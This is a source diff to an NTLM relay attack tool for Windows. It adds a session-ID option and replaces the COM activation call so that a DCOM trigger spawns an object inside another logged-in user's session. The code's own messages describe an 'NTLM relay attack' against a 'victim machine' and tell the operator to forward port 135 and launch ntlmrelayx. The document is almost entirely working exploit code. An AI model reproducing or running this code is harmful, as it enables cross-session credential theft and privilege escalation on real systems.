@@ -3,7 +3,9 @@
 #include "HTTPCrossProtocolRelay.h"
 #include "RogueOxidResolver.h"
 #include "IStorageTrigger.h"
-
+#include "RogueOxidResolver_h.h"
+#include <system_error>
+int g_sessionID;
 wchar_t* g_rpc2httpCrossProtocolRelayPort;
 wchar_t* remote_ip;
 
@@ -35,11 +37,18 @@ int wmain(int argc, wchar_t** argv)
 	wchar_t* rogueOxidResolverIp = defaultRogueOxidResolverIp;
 	wchar_t* httpCrossProtocolrelayPort = defaultHTTPCrossProtocolrelayPort;
 	wchar_t* clsid = defaultClsid;
+
 	while ((argc > 1) && (argv[cnt][0] == '-'))
 	{
 
 		switch (argv[cnt][1])
 		{
+
+		case 's':
+			++cnt;
+			--argc;
+			g_sessionID = _wtoi(argv[cnt]);
+			break;
 
 		case 'c':
 			++cnt;
@@ -96,6 +105,8 @@ int wmain(int argc, wchar_t** argv)
 		exit(-1);
 	}
 
+
+
 	remote_ip = remoteIpRelay;
 	g_rpc2httpCrossProtocolRelayPort = httpCrossProtocolrelayPort;
 	printf("[*] Starting the NTLM relay attack, remember to forward tcp port 135 on %S to your victim machine on port %S before and to launch ntlmrelayx on %S!!\n", remoteIpRelay, rogueOxidResolverPort, remoteIpRelay);
@@ -145,17 +156,36 @@ void TriggerDCOM(wchar_t* clsid_string)
 
 	CLSID clsid;
 	CLSIDFromString(clsid_string, &clsid);
-	CLSID tmp;
+	CLSID tmp, CLSID_Activator;
 	//IUnknown IID
 	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
+	CLSIDFromString(OLESTR("{0000033C-0000-0000-c000-000000000046}"), &CLSID_Activator);
+	IID iid;
+	IIDFromString(L"000001B9-0000-0000-c000-000000000046", &iid);
+
+
 	MULTI_QI qis[1];
 	qis[0].pIID = &tmp;
 	qis[0].pItf = NULL;
 	qis[0].hr = 0;
-
+	IStandardActivator* pActivator;
+	HRESULT r = CoCreateInstance(CLSID_Activator, NULL, CLSCTX_INPROC_SERVER, IID_IStandardActivator, (LPVOID*)& pActivator);
+	//printf("CoCreate=%d\n", r);
+	ISpecialSystemPropertiesActivator* pSpecialProperties = NULL;
+	//printf("start query inter\n");
+	r = pActivator->QueryInterface(__uuidof(ISpecialSystemPropertiesActivator), (void**)& pSpecialProperties);
+	//printf("query inter: %d\n", r);
+	//printf("start set session");
+	r = pSpecialProperties->SetSessionId(g_sessionID, 0, 1);
+	//printf("set session: %d\n", r);
+	printf("[*] Spawning COM object in the session: %d\n", g_sessionID);
+	printf("[*] Calling StandardGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
+	HRESULT status = pActivator->StandardGetInstanceFromIStorage(NULL, clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
+	std::string message = std::system_category().message(status);
+	//printf("Error: %s\n", message.c_str());
 	//Call CoGetInstanceFromIStorage
-	printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
-	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
+	//printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
+	//HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
 	if (!g_SuccessTrigger)
 	{
 		if (status == CO_E_BAD_PATH)
